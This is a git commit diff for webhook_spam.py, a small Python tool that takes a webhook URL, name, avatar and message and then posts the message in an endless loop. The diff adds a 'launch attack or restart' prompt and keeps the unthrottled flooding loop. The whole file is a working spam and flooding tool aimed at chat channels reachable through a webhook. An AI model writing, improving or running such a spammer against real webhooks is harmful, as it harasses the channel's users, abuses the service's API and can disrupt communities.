73460b3c1d496e8e7812399cd78c2faae76f44b0
Inferno <83884499+Inferno-Meow@users.noreply.github.com>
2021-05-09 17:51:01 +0530

    Update webhook_spam.py

--- webhook_spam.py
+++ webhook_spam.py
@@ -1,5 +1,6 @@
 import requests
 import colorama
+import asyncio
 from colorama import Fore, Back, Style
 
 #imported colorama just to make the code fancier
@@ -15,22 +16,36 @@ Made by:
 
 def main():
     print(Creator)
-    web= input(f"{Fore.RED}Please enter the Webhook link here:")
-    username = input(f"{Fore.BLUE}Webhook Name (ur choice):")
-    picture = input(f"{Fore.BLUE}Webhook avatar (skip if you want none)?:")
-    content = input(f"{Fore.RED}Message You want to spam:")
+    web= input(f"{Fore.RED}Please enter the Webhook link here(Important) :")
+    username = input(f"{Fore.BLUE}Webhook Name (Skip if you want none) :")
+    picture = input(f"{Fore.BLUE}Webhook avatar (skip if you want none)? :")
+    content = input(f"{Fore.RED}Message You want to spam(Important) :")
+    l = input(f"{Fore.GREEN}Launch attack or restart (launch/restart)? :")
+    if l=="launch":
+        main_stuff={'content':content,'username':username,'avatar_url':picture}
+        while True:
+            r= requests.post(web,data=main_stuff) 
+            if r.status_code==204:
+                print(f"{Fore.GREEN} >>>>>> Message Sent >>>>")
+            else:
+                print(f"{Fore.BLACK} >>>>>> Delay(please wait) >>>>>>")
 
-
-
-    main_stuff={'content':content,'username':username,'avatar_url':picture}
-    while True:
-        r= requests.post(web,data=main_stuff)     #does the execution part
-        if r.status_code==204:
-            print(f"{Fore.GREEN} >>>>>> Message Sent >>>>")
+    elif l=="restart":
+         main()
+    else:
+        print(f"{Fore.RED}===========================================")
+        print(f"{Fore.YELLOW} ⚠Please enter a correct option! ")
+        print(f"{Fore.RED}===========================================")
+        pff = input(f"{Fore.GREEN} Restart (y/n)? : ")
+        if pff == "y":
+            main()
         else:
-            print(f"{Fore.BLACK} >>>>>> Delay(please wait) >>>>>>")
+            exit()
+            
+
+
+    
     
 main()
-
 
 
